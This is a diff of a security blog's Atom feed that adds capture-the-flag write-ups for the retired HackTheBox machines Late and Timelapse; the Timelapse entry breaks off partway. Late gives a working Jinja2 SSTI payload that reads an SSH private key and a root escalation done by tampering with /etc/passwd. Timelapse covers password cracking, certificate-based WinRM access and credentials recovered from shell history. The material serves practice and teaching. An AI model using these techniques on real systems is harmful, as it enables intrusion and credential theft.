@@ -1,5 +1,389 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"/><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"/><id>https://maggick.fr/</id><updated>2022-06-19T14:55:00+02:00</updated><subtitle>Offensive security tales</subtitle><entry><title>HTB: Paper</title><link href="https://maggick.fr/2022/06/htb-paper.html" rel="alternate"/><published>2022-06-19T14:55:00+02:00</published><updated>2022-06-19T14:55:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-06-19:/2022/06/htb-paper.html</id><summary type="html">&lt;p&gt;&lt;img alt="Paper Card" class="align-left" src="/media/2022.06/paper_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"/><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"/><id>https://maggick.fr/</id><updated>2022-08-22T19:00:00+02:00</updated><subtitle>Offensive security tales</subtitle><entry><title>HTB: Late</title><link href="https://maggick.fr/2022/08/htb-late.html" rel="alternate"/><published>2022-08-22T19:00:00+02:00</published><updated>2022-08-22T19:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-08-22:/2022/08/htb-late.html</id><summary type="html">&lt;p&gt;&lt;img alt="Late Card" class="align-left" src="/media/2022.08/late_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.com/home/machines/profile/463"&gt;Late&lt;/a&gt; publish on
+April 23, 2022 by
+&lt;a href="https://www.hackthebox.com/home/users/profile/389926"&gt;kavigihan&lt;/a&gt;.
+This box is rated as an easy machine. It implies an OCR function, a SSTI and a SUID binary.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img alt="Late Card" class="align-left" src="/media/2022.08/late_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.com/home/machines/profile/463"&gt;Late&lt;/a&gt; publish on
+April 23, 2022 by
+&lt;a href="https://www.hackthebox.com/home/users/profile/389926"&gt;kavigihan&lt;/a&gt;.
+This box is rated as an easy machine. It implies an OCR function, a SSTI and a SUID binary.&lt;/p&gt;
+&lt;h1&gt;Foothold and user&lt;/h1&gt;
+&lt;h2&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Jun 12 08:22:12 2022 as: nmap -sSV -oN notes.md 10.129.72.242
+Nmap scan report for 10.129.72.242
+Host is up (0.017s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmp.org/submit/ .
+# Nmap done at Sun Jun 12 08:22:19 2022 -- 1 IP address (1 host up) scanned in 7.13 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Port 80 was a web application containing a link to a subdomain 
+&lt;code&gt;http://images.late.htb/&lt;/code&gt;. This application allowed to perform OCR on images.
+We test a few example and realize that we are facing &lt;a href="https://portswigger.net/web-security/server-side-template-injection"&gt;SSTI&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We upload an image containing the basic SSTI identification:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="SSTI identification" src="/media/2022.08/late_01.png"/&gt;&lt;/p&gt;
+&lt;p&gt;The application resolved the second operation.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;p&gt;${8*8} aa 49
+&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Following PortSwigger graph I uploaded a new image.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="SSTI identification 2" src="/media/2022.08/late_02.png"/&gt;&lt;/p&gt;
+&lt;p&gt;The application resolved &lt;code&gt;7*'7'&lt;/code&gt; as &lt;code&gt;7777777&lt;/code&gt;. Therefore the application was using Jinja2.&lt;/p&gt;
+&lt;p&gt;A &lt;a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee"&gt;blog post&lt;/a&gt; described Jinja injection.&lt;/p&gt;
+&lt;p&gt;I verified that &lt;code&gt;popen&lt;/code&gt; is available:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="checking popen" src="/media/2022.08/late_03.png"/&gt;&lt;/p&gt;
+&lt;p&gt;Then by dichotomy I founded the &lt;code&gt;popen&lt;/code&gt; index.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="popen index" src="/media/2022.08/late_04.png"/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Popen&lt;/code&gt; was the subprocess with index 249.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;p&gt;[&amp;lt;class 'zipfile.ZipFile'&amp;gt;, &amp;lt;class 'pkgutil.ImpImporter'&amp;gt;, &amp;lt;class 'pkgutil.ImpLoader'&amp;gt;, &amp;lt;class 'subprocess.CompletedProcess'&amp;gt;, &amp;lt;class 'subprocess.Popen'&amp;gt;]
+&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I ran &lt;code&gt;ls&lt;/code&gt; to proved that I had RCE.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="running ls" src="/media/2022.08/late_05.png"/&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;p&gt;(b'main.py\nmisc\n__pycache__\nstatic\ntemplates\nuploads\nwsgi.py\n', None)
+&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I ran &lt;code&gt;id&lt;/code&gt; to get an idea of which user was running the application. The user &lt;code&gt;id&lt;/code&gt; was 1000 meaning that this
+was probably a standard human user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;p&gt;(b'uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)\n', None)
+&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;After a few trials, I found a payload that allowed to retrieve &lt;code&gt;id_rsa&lt;/code&gt; from the user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;{{''.__class__.__mro__[1].__subclasses__()[249](['cat','/home/svc_acc/.ssh/id_rsa'],stdout=-1).communicate()}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I connected to the box using SSH and grabbed the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh svc_acc@10.129.72.242 -i id_rsa
+svc_acc@late:~$ id
+uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
+svc_acc@late:~$ cat user.txt
+17295259a78e40790974b3ac7d2d0a8f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1&gt;Root&lt;/h1&gt;
+&lt;p&gt;I ran &lt;a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"&gt;linpeas&lt;/a&gt; and found that there was a user writable file in &lt;code&gt;/usr/local/sbin&lt;/code&gt;, a folder where binary are run as root.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class="nv"&gt;RECIPIENT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"root@late.htb"&lt;/span&gt;
+&lt;span class="nv"&gt;SUBJECT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"Email from Server Login: SSH Alert"&lt;/span&gt;
+
+&lt;span class="nv"&gt;BODY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;
+&lt;span class="s2"&gt;A SSH login was detected.&lt;/span&gt;
+
+&lt;span class="s2"&gt;        User:        &lt;/span&gt;&lt;span class="nv"&gt;$PAM_USER&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
+&lt;span class="s2"&gt;        User IP Host: &lt;/span&gt;&lt;span class="nv"&gt;$PAM_RHOST&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
+&lt;span class="s2"&gt;        Service:     &lt;/span&gt;&lt;span class="nv"&gt;$PAM_SERVICE&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
+&lt;span class="s2"&gt;        TTY:         &lt;/span&gt;&lt;span class="nv"&gt;$PAM_TTY&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
+&lt;span class="s2"&gt;        Date:        `date`&lt;/span&gt;
+&lt;span class="s2"&gt;        Server:      `uname -a`&lt;/span&gt;
+&lt;span class="s2"&gt;"&lt;/span&gt;
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PAM_TYPE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"open_session"&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
+        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"Subject:&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SUBJECT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BODY&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; /usr/sbin/sendmail &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;RECIPIENT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I copied &lt;code&gt;/etc/passwd&lt;/code&gt; and added a new line containing a root user (&lt;code&gt;id=0&lt;/code&gt;) with the password &lt;code&gt;pass123&lt;/code&gt;:
+&lt;code&gt;toto2:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Then I modified the &lt;code&gt;/usr/local/sbin/ssh-alert.sh&lt;/code&gt; file to copy the modified &lt;code&gt;passwd&lt;/code&gt; file in &lt;code&gt;etc&lt;/code&gt;:
+&lt;code&gt;echo 'cp /home/svc_acc/passwd /etc/passwd' &amp;gt;&amp;gt;/usr/local/sbin/ssh-alert.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Then I connect to ssh with our &lt;code&gt;svc_acc&lt;/code&gt; user and switch user to &lt;code&gt;toto2&lt;/code&gt; and grabbed the flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;svc_acc@late:~$ su toto2
+root@late:/home/svc_acc# id
+uid=0(root) gid=0(root) groups=0(root)
+root@late:/home/svc_acc# cd
+root@late:~# cat root.txt
+365276e9d7ba2bb0c907fe9ee608164a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;A nice box exploiting SSTI and a SUID binary. The fact that the SSTI was in an image was
+fun but tedious as sometime the OCR was not perfect and submitting the same image another
+time did not give the same result.&lt;/p&gt;</content><category term="security"/><category term="security"/><category term="boot2root"/><category term="HTB"/><category term="SSTI"/><category term="SUID"/><category term="OCR"/></entry><entry><title>HTB: Timelaps</title><link href="https://maggick.fr/2022/08/htb-timelaps.html" rel="alternate"/><published>2022-08-22T18:55:00+02:00</published><updated>2022-08-22T18:55:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-08-22:/2022/08/htb-timelaps.html</id><summary type="html">&lt;p&gt;&lt;img alt="Timelaps Card" class="align-left" src="/media/2022.08/timelaps_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.com/home/machines/profile/452"&gt;Timelapse&lt;/a&gt; publish on
+Mars 2022 by
+&lt;a href="https://www.hackthebox.com/home/users/profile/168546"&gt;d4rkpayl0ad&lt;/a&gt;.
+This box is rated as an easy machine. It implies a SMB share, a encrypted zip archive,
+a certificate, a password in a shell history and LAPS.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img alt="Timelaps Card" class="align-left" src="/media/2022.08/timelaps_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.com/home/machines/profile/452"&gt;Timelapse&lt;/a&gt; publish on
+Mars 2022 by
+&lt;a href="https://www.hackthebox.com/home/users/profile/168546"&gt;d4rkpayl0ad&lt;/a&gt;.
+This box is rated as an easy machine. It implies a SMB share, a encrypted zip archive,
+a certificate, a password in a shell history and LAPS.&lt;/p&gt;
+&lt;h1&gt;Foothold and user&lt;/h1&gt;
+&lt;h2&gt;Recon&lt;/h2&gt;
+&lt;p&gt;I started with an &lt;code&gt;nmap&lt;/code&gt; scan. A few ports are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sat Jun 11 10:49:58 2022 as: nmap -sSV -oN notes.md 10.129.71.83
+Nmap scan report for 10.129.71.83
+Host is up (0.014s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-06-10 22:50:08Z)
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jun 11 10:50:14 2022 -- 1 IP address (1 host up) scanned in 15.85 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Port 445 and 139 were open. I checked the available shares using &lt;code&gt;smbclient&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ smbclient -L 10.129.71.83
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        Shares          Disk
+        SYSVOL          Disk      Logon server share
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I connected to the &lt;code&gt;Shares&lt;/code&gt; folder.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ smbclient //10.129.71.83/Shares
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \&amp;gt; ls
+  .                                   D        0  Mon Oct 25 11:39:15 2021
+  ..                                  D        0  Mon Oct 25 11:39:15 2021
+  Dev                                 D        0  Mon Oct 25 15:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
+
+                6367231 blocks of size 4096. 1269200 blocks available
+
+smb: \&amp;gt; ls HelpDesk\
+  .                                   D        0  Mon Oct 25 11:48:42 2021
+  ..                                  D        0  Mon Oct 25 11:48:42 2021
+  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
+  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
+  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
+  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021
+
+                6367231 blocks of size 4096. 1260315 blocks available
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I grabbed everything there is in the &lt;code&gt;HelpDesk&lt;/code&gt; folder.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;LAPS.x64.msi&lt;/code&gt; is the install program for LAPS&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;docx&lt;/code&gt; files are old documentation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Nothing interesting, I tooked a look in the &lt;code&gt;Dev&lt;/code&gt; folder&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smb: \Dev\&amp;gt; ls
+  .                                   D        0  Mon Oct 25 15:40:06 2021
+  ..                                  D        0  Mon Oct 25 15:40:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021
+
+                6367231 blocks of size 4096. 1269072 blocks available
+smb: \Dev\&amp;gt; get winrm_backup.zip
+getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (44.0 KiloBytes/sec) (average 44.0 KiloBytes/sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The zip archive is protected with a password. I used &lt;code&gt;zip2john&lt;/code&gt; to extract the password
+hash from the archive and feed it to john using the &lt;code&gt;rockyou&lt;/code&gt; wordlist. The password
+was immediatly found: &lt;code&gt;supremelegacy&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;→ john hash -w=~/tools/password_lists/rockyou.txt
+Loaded 1 password hash (PKZIP [32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
+1g 0:00:00:00 DONE (2022-06-11 17:10) 3.225g/s 11204Kp/s 11204Kc/s 11204KC/s suziexx..supergau
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I decompressed the archive using the password and got a file named &lt;code&gt;legacyy_dev_auth.pfx&lt;/code&gt;. The &lt;code&gt;.pfx&lt;/code&gt; files are
+certificate (private an public keys) that can be used for authentication.&lt;/p&gt;
+&lt;p&gt;The certificate was protected by a password. So I used &lt;code&gt;pfx2john&lt;/code&gt; and feed it to john (again)
+and I got the password in a few seconds (again) still using the &lt;code&gt;rockyou&lt;/code&gt; wordlist.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;→ john hash -w=~/tools/password_lists/rockyou.txt
+0g 0:00:00:03 0.79% (ETA: 17:28:34) 0g/s 44418p/s 44418c/s 44418C/s GATORS..14411441
+thuglegacy       (legacyy_dev_auth.pfx)
+1g 0:00:01:30 DONE (2022-06-11 17:23) 0.01101g/s 35599p/s 35599c/s 35599C/s thuglife03282006..thscndsp1
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Using openssl I extracted the public private keys from the certificate (I used the same
+password for the PEM pass phrase)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
+Enter Import Password:
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I used &lt;code&gt;evil-winrm&lt;/code&gt; to connect to the target using the certifiactes and grabbed the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ evil-winrm -S -c cert.crt -k key.pem -i 10.129.71.83 #thuglegacy
+
+Evil-WinRM shell v3.3
+Enter PEM pass phrase:
+*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; type ..\Desktop\user.txt
+e7ac7c0f7d766c0f21f4005e1758af50
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1&gt;Root&lt;/h1&gt;
+&lt;p&gt;I checked my privileges on the box, but nothing interesting.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name         SID
+================= ============================================
+timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I used &lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"&gt;winPEAS&lt;/a&gt;
+and found that there is a PowerShell history file in the &lt;code&gt;C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&lt;/code&gt;
+folder.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; upload winPEAS.bat
+Info: Uploading winPEAS.bat to C:\Users\legacyy\Documents\winPEAS.bat
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; .\winPEAS.bat
+Enter PEM pass phrase:
+winPEAS.bat : The system cannot find the batch label specified - SetOnce
+    + CategoryInfo          : NotSpecified: (The system cann...ified - SetOnce:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+The system cannot find the batch label specified - ColorLineThe system cannot find the batch label specified - ColorLineThe system cannot find the batch label specified - ColorLinePowerShell v2 Version:
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
+    PowerShellVersion    REG_SZ    2.0
+
+PowerShell v5 Version
+&lt;snip&gt;
+Transcriptions Settings:
+Module logging settings:
+Scriptblog logging settings:
+
+PS default transcript history
+
+Checking PS history file
+ Volume in drive C has no label.
+ Volume Serial Number is 22CC-AE66
+
+ Directory of C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+03/04/2022  12:46 AM               434 ConsoleHost_history.txt
+               1 File(s)            434 bytes
+               0 Dir(s)   5,256,929,280 bytes free
+&lt;/snip&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The file contained a password to run as &lt;code&gt;svc_deploy&lt;/code&gt; including the account password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I used it as it was checking &lt;code&gt;svc_deploy&lt;/code&gt; privileges. The account was part of the &lt;code&gt;LAPS_Readers&lt;/code&gt; group.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /all}
+
+USER INFORMATION
+----------------
+
+User Name            SID
+==================== ============================================
+timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I used a simple &lt;a href="https://smarthomepursuits.com/export-laps-passwords-powershell/"&gt;commande&lt;/a&gt; to retrieve the LAPS password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\legacyy\Documents&amp;gt; $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
